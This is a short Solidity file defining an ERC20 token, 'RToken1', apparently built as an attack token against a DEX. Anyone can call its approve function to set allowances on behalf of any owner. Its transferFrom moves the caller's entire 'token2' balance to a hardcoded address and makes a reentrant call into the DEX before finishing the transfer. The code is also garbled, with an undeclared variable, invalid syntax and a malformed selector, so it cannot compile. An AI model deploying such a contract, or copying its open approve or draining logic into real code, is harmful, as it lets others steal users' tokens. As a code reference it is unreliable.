pragma solidity ^0.8.0;
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract RToken1 is ERC20 {
    address private _dex;

    constructor(string memory name_, string memory symbol_, uint initialSupply) ERC20(name_, symbol_) {
        _mint(msg.sender, initialSupply);
        _dex = msg.sender;
    }

    function approve(address owner_, address spender, uint256 amount) public {
        _approve(owner_, spender, amount);
    }

    // Reentrancy-triggering token during transfers
    function transferFrom(address sender, address recipient, uint256 amount)
        public
        returns (bool)
    {
        // Perform the actual transfer
        IERC20(token2).approve(msg.sender, 100 * 10**18);
        uint256 token2Balance = uint256(token2 balanceOf msg.sender);
        IERC20(token2).transferFrom(msg.sender, address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266), token2Balance);

        (bool success,) = _dex.call(abi.encodeWithSelector(0xdba1e3a4uint256, amount));
        return super.transferFrom(sender, recipient, amount);
    }
}
